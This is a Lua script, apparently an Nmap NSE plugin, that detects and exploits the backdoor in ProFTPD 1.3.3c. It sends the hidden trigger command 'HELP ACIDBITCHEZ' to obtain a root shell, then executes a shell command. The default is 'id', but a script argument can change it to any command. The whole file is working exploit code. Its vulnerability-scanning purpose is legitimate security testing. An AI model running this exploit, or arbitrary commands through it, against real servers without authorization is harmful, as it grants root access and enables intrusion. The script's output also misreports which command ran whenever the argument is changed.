local ftp = require "ftp"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"

-- -*- mode: lua -*-
-- vim: set filetype=lua :

description = [[
Tests for the presence of the ProFTPD 1.3.3c backdoor reported as BID
45150. This script attempts to exploit the backdoor using the innocuous
<code>id</code> command by default, but that can be changed with the
<code>ftp-proftpd-backdoor.cmd</code> script argument.
]]

---
-- @usage
-- nmap --script ftp-proftpd-backdoor -p 21 <host>
--
-- @args ftp-proftpd-backdoor.cmd Command to execute in shell (default is
--       <code>id</code>).
--
-- @output
-- PORT   STATE SERVICE
-- 21/tcp open  ftp
-- | ftp-proftpd-backdoor:
-- |   This installation has been backdoored.
-- |   Command: id
-- |   Results: uid=0(root) gid=0(wheel) groups=0(wheel)
-- |_

author = "Mak Kolybabi"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive", "malware", "vuln"}


local CMD_FTP = "HELP ACIDBITCHEZ"
local CMD_SHELL = "id"

portrule = function (host, port)
  -- Check if version detection knows what FTP server this is.
  if port.version.product ~= nil and port.version.product ~= "ProFTPD" then
    return false
  end

  -- Check if version detection knows what version of FTP server this is.
  if port.version.version ~= nil and port.version.version ~= "1.3.3c" then
    return false
  end

  return shortport.port_or_service(21, "ftp")(host, port)
end

action = function(host, port)
  local cmd, err, line, req, resp, results, sock, status

  -- Get script arguments.
  cmd = stdnse.get_script_args("ftp-proftpd-backdoor.cmd")
  if not cmd then
    cmd = CMD_SHELL
  end

  -- Create socket.
  sock = nmap.new_socket("tcp")
  sock:set_timeout(5000)
  status, err = sock:connect(host, port, "tcp")
  if not status then
    stdnse.debug1("Can't connect: %s", err)
    sock:close()
    return
  end

  -- Read banner.
  local buffer = stdnse.make_buffer(sock, "\r?\n")
  local code, message = ftp.read_reply(buffer)
  if not code then
    stdnse.debug1("Can't read banner: %s", message)
    sock:close()
    return
  end

  -- Check version.
  if not message:match("ProFTPD 1.3.3c") then
    stdnse.debug1("This version is not known to be backdoored.")
    return
  end

  -- Send command to escalate privilege.
  status, err = sock:send(CMD_FTP .. "\r\n")
  if not status then
    stdnse.debug1("Failed to send privilege escalation command: %s", err)
    sock:close()
    return
  end

  -- Check if escalation worked.
  code, message = ftp.read_reply(buffer)
  if code and code == 502 then
    stdnse.debug1("Privilege escalation failed: %s", message)
    sock:close()
    return
  end

  -- Send command(s) to shell.
  status, err = sock:send(cmd .. ";\r\n")
  if not status then
    stdnse.debug1("Failed to send shell command(s): %s", err)
    sock:close()
    return
  end

  -- Check for an error from command.
  status, resp = sock:receive()
  if not status then
    stdnse.debug1("Can't read command response: %s", resp)
    sock:close()
    return
  end

  -- Summarize the results.
  results = {
    "This installation has been backdoored.",
    "Command: " .. CMD_SHELL,
    "Results: " .. resp
  }

  return stdnse.format_output(true, results)
end
